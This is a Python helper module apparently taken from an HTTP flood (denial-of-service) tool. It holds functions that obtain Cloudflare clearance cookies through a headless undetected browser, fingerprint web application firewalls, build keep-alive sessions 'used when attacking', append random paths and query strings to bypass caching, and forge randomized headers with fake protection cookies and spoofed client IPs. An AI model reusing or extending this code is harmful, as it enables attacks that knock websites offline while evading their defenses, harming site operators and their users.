# import modules
import os, requests, socket, time, sys
import undetected_chromedriver as webdriver
from random import randint, choice, shuffle, random
from string import ascii_letters, digits, ascii_uppercase
from netaddr import IPAddress, IPNetwork
from urllib.parse import urlparse
from colorama import Fore

from src.core import Core
from src.proxy import *

# load all files
ualist = []
with open('src/lists/useragents.txt', 'r', buffering=(2048*2048)) as uafile:
    [ualist.append(line.strip('\n')) for line in uafile.readlines()]

reflist = []
with open('src/lists/referers.txt', 'r', buffering=(2048*2048)) as reffile:
    [reflist.append(line.strip('\n')) for line in reffile.readlines()]

orlist = []
with open('src/lists/open redirects.txt', 'r', buffering=(2048*2048)) as orfile:
    [orlist.append(line.strip('\n')) for line in orfile.readlines()]

keywords = []
with open('src/lists/keywords.txt', 'r', buffering=(2048*2048)) as kwfile:
    [keywords.append(line.strip('\n')) for line in kwfile.readlines()]

cf_ips = []
with open('src/lists/cf_ips.txt', 'r', buffering=(2048*2048)) as cffile:
    [cf_ips.append(line.rstrip()) for line in cffile.readlines()]

# define some basic colors
fr = Fore.RED
fy = Fore.YELLOW
fw = Fore.WHITE
fg = Fore.GREEN
fg2 = Fore.LIGHTBLACK_EX
frr = Fore.RESET
flc = Fore.LIGHTCYAN_EX
flr = Fore.LIGHTRED_EX
fc = Fore.CYAN

def get_cookie(url):
    '''
    Gets CF cookie, which is basically a entry ticket
    '''

    options = webdriver.ChromeOptions()
    arguments = [
        '--no-sandbox', 
        '--disable-setuid-sandbox', 
        '--disable-infobars', 
        '--disable-logging', 
        '--disable-login-animations',
        '--disable-notifications', 
        '--disable-gpu', 
        '--headless', 
        '--start-maxmized',
        '--silent',
        '--port=0',
        '--incognito',
       f'--proxy-server={giveproxy(True)}',
        '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
    ]

    for argument in arguments:
        options.add_argument(argument)

    print('[BYPASS] Launching browser')
    driver = webdriver.Chrome(options=options, driver_executable_path='src\\drivers\\chromedriver.exe')
    driver.implicitly_wait(3)
    driver.get(url)

    for _ in range(60):
        cookies = driver.get_cookies()

        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                Core.bypass_cookieJAR = driver.get_cookies()[tryy]
                Core.bypass_useragent = driver.execute_script("return navigator.userAgent")
                Core.bypass_cookie = f"{Core.bypass_cookieJAR['name']}={Core.bypass_cookieJAR['value']}"
                driver.quit()

                return True
            else:
                tryy += 1
                pass

        time.sleep(1)
    driver.quit()
    return False

def fwDetect(url):
    '''
    Function to detect firewalls
    '''
    
    fwdict = {
        'cloudflare': 'Cloudflare Inc', 'cloudflare-nginx': 'Cloudflare Inc', 'cf-ray': 'Cloudflare Inc',
        'sucuri/cloudproxy': 'Sucuri',
        'wordfence': 'WordFence',
        'akamai': 'Akamai',
        'comodo': 'Comodo',
        'incapsula': 'Incapsula',
        'mod_security': 'ModSecurity',
        '360': '360 Web Application Firewall'
    }

    try:
        for i in cf_ips: # first we check if its CF only
            if IPAddress(socket.gethostbyname(urlparse(url).netloc)) in IPNetwork(i):
                return 'Cloudflare Inc'

        req = requests.get(url)
        server_header = req.headers.get('server')
        firewall = server_header if server_header.lower() in fwdict.keys() else None # first we try it with HTTP header checking
        if firewall is None: # then we try it by looking through the webpage contents
            for fw_ident, fw_name in fwdict.items():
                if fw_ident in req.text.lower(): return fw_name
                else: pass

        if firewall is None: # if its still None, we try HTTP response code checking
            if req.status_code == 406 or req.status_code == 501: firewall = 'ModSecurity'
            elif req.status_code == 999: firewall = 'WebKnight'
            elif req.status_code == 419: firewall = 'F5 BIG IP'
            else: firewall = 'Unknown' # last resort
    except: return 'Exception while checking'
    return firewall

def isIPv4(ip):
    '''
    Function to check if a IP is a valid IPv4 address
    '''

    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts)

def isIPv6(ip):
    '''
    Function to check if a IP is a valid IPv6 address'''

    try:
        socket.inet_pton(socket.AF_INET6, ip)

        return True
    except:
        return False

def isCF(ip): # credits to Wreckuests
    '''
    Function to check if a IP is in cloudflare's ranges
    '''

    for i in cf_ips:
        return (IPAddress(ip) in IPNetwork(i))

def calcbestworkers():
    ''' 
    Function to calculate the best workers, in terms of rps
    '''

    sorted_dict = {}
    unsorted_dict = dict(sorted(Core.infodict.items(), key=lambda x:x[1]['req_sent'], reverse=True))
    [sorted_dict.update({x: y}) for x, y in unsorted_dict.items()]

    return sorted_dict

def clear():
    ''' 
    Simple function to clear screen
    '''

    try: os.system('cls' if os.name == 'nt' else 'clear')
    except: pass

def randip():
    '''
    Function to generate random IPv4 address
    '''

    p1, p2, p3, p4 = str(randint(0, 256)),str(randint(0, 256)),str(randint(0, 256)),str(randint(0, 256))

    return f'{p1}.{p2}.{p3}.{p4}'

def randstr(strlen, chars=ascii_letters):
    '''
    Function to generate a random string
    '''
    
    return ''.join(choice(chars) for _ in range(strlen))

class HTTPAdapter(requests.adapters.HTTPAdapter):
    '''
    HTTP adapter which allows socket modification
    '''

    # stolen from stackoverflow xd
    def __init__(self, *args, **kwargs):
        self.socket_options = kwargs.pop("socket_options", None)
        super(HTTPAdapter, self).__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        if self.socket_options is not None:
            kwargs["socket_options"] = self.socket_options
        super(HTTPAdapter, self).init_poolmanager(*args, **kwargs)

def createsession(verify=False):
    '''
    Function that creates a requests session object used when attacking
    '''

    adapter = HTTPAdapter(socket_options=[
        (socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1), 
        (socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 5), 
        (socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5), 
        (socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    ])

    session = requests.session()
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.verify = verify

    if Core.proxy != None: # sets proxy
        proxurl = f'{Core.proxy_type.lower()}{"h" if Core.proxy_resolve is True else ""}://{Core.proxy_user if Core.proxy_user != None else ""}{":"+Core.proxy_passw if Core.proxy_passw != None else ""}{"@" if Core.proxy_user != None else "@" if Core.proxy_passw != None else ""}{Core.proxy}'
        session.proxies = { 'http': proxurl, 'https': proxurl }
    else: session.proxies = {}

    return session

def buildblock(url):
    '''
    Function to generate a block that gets appened to the target url
    '''
    if url is None: return ''
    block = '' if url.endswith('/') else '/'

    if Core.bypass_cache:

        block += randstr(randint(5, 10))
        for _ in range(randint(2, 10)):
            if randint(0, 1) == 1: block += f'/{randstr(randint(5, 10))}'
            else: block += f'/{randstr(randint(5, 10), chars=digits)}'
        
        block += f'?q={choice(keywords).replace(" ", "+")}'

        for _ in range(randint(2, 9)):
            if randint(0, 1) == 1: block += f'&{randstr(randint(5, 10))}={choice(keywords).replace(" ", "+")}'
            else: block += f'&{choice(keywords).replace(" ", "+")}={choice(keywords).replace(" ", "+")}'
        
        return block
    else:
        return ''

def buildheaders(url, useragent, referer):
    '''
    Function to generate randomized headers
    '''

    reflist.append(url+buildblock(url)) # append the target url to the referer list itself

    cache_controls = ['no-cache', 'max-age=0', 'no-store', 'no-transform', 'only-if-cached', 'must-revalidate', 'no-transform'] if not Core.bypass_cache else ['no-store', 'no-cache', 'no-transform']
    accept_encodings = ['*', 'identity', 'gzip', 'deflate', 'compress', 'br']
    accept_langs = ["*", "af","hr","el","sq","cs","gu","pt","sw","ar","da","ht","pt-br","sv","nl","he","pa","nl-be","hi","pa-in","sv-sv","en","hu","pa-pk","ta","en-au","ar-jo","en-bz","id","rm","te","ar-kw","en-ca","iu","ro","th","ar-lb","en-ie","ga","ro-mo","tig","ar-ly","en-jm","it","ru","ts","ar-ma","en-nz","it-ch","ru-mo","tn","ar-om","en-ph","ja","sz","tr","ar-qa","en-za","kn","sg","tk","ar-sa","en-tt","ks","sa","uk","ar-sy","en-gb","kk","sc","hsb","ar-tn","en-us","km","gd","ur","ar-ae","en-zw","ky","sd","ve","ar-ye","eo","tlh","si","vi","ar","et","ko","sr","vo","hy","fo","ko-kp","sk","wa","as","fa","ko-kr","sl","cy","ast","fj","la","so","xh","az","fi","lv","sb","ji","eu","fr","lt","es","zu","bg","fr-be","lb","es-ar","be","fr-ca","mk","es-bo","bn","fr-fr","ms","es-cl","bs","fr-lu","ml","es-co","br","fr-mc","mt","es-cr","bg","fr-ch","mi","es-do","my","fy","mr","es-ec","ca","fur","mo","es-sv","ch","gd","nv","es-gt","ce","gd-ie","ng","es-hn","zh","gl","ne","es-mx","zh-hk","ka","no","es-ni","zh-cn","de","nb","es-pa","zh-sg","de-at","nn","es-py","zh-tw","de-de","oc","es-pe","cv","de-li","or","es-pr","co","de-lu","om","es-es","cr","de-ch","fa","es-uy","fa-ir","es-ve"]
    content_types = ['multipart/form-data', 'application/x-url-encoded']
    accepts = ['text/plain', '*/*', '/', 'application/json', 'text/html', 'application/xhtml+xml', 'application/xml', 'image/webp', 'image/*', 'image/jpeg', 'application/x-ms-application', 'image/gif', 'application/xaml+xml', 'image/pjpeg', 'application/x-ms-xbap', 'application/x-shockwave-flash', 'application/msword']

    # we shuffle em
    for toshuffle in [cache_controls, accept_encodings, content_types, accepts]:
        shuffle(toshuffle)
    
    headers = choice([ # chooses between XMLHttpRequest and a random/predefined useragent
        {'User-Agent': None, 'X-Requested-With': 'XMLHttpRequest'}, 
        {'User-Agent': choice(ualist) if useragent == None else useragent}
    ])

    headers.update({ # default headers
        'X-Forwarded-Proto': 'Http',
        'X-Forwarded-Host': f'{urlparse(url).netloc}, 1.1.1.1',
        'Cache-Control': ', '.join(cache_controls[:randint(1,len(cache_controls))]),
        'Accept-Encoding': ', '.join(accept_encodings[:randint(1,len(accept_encodings))]),
        'Accept': ', '.join(accepts[:randint(1,len(accepts))]),
        'Accept-Language':  ','.join(accept_langs[:randint(1,len(accept_langs))]),
    })

    if randint(0,1) == 1: # referer
        rand_referer = choice(reflist)
        headers.update({'Referer': rand_referer+buildblock(rand_referer) if referer == None else referer})
    
    if randint(0,1) == 1: # cookie
        headers.update({'Cookie': choice([
            randstr(randint(60, 90), chars=ascii_uppercase+str(digits)),
            f'id={randstr(randint(2,5))}',
            f'PHPSESSID={randstr(randint(50,60))}; csrftoken={randstr(randint(4,20))}; _gat=1',
            f'cf_chl_2={randstr(randint(4,20))}; cf_chl_prog=x11; cf_clearance={randstr(randint(30,50))}',
            f'__cf_bm={randstr(randint(100,200))}; __cf_bm={randstr(randint(100,200))}',
            f'language=en; AKA_A2=A; AMCVS_3AE7BD6E597F48940A495ED0%40AdobeOrg={str(randint(0,1))}; AMCV_{randstr(randint(20,60))}={randstr(randint(50,100))}; ak_bmsc={randstr(randint(50,100), chars=ascii_uppercase)}~{randstr(randint(200,600))}'
        ])})
    
    #if randint(0,1) == 1: # viewport
    #    headers.update({'viewport-width': str(randint(100, 300))})
    
    if randint(0,1) == 1: # "fake" ip
        spoofip = randip()
        headers.update({
            'Via': spoofip,
            'Client-IP': spoofip,
            'X-Forwarded-For': spoofip,
            'Real-IP': spoofip
        })
    
    return headers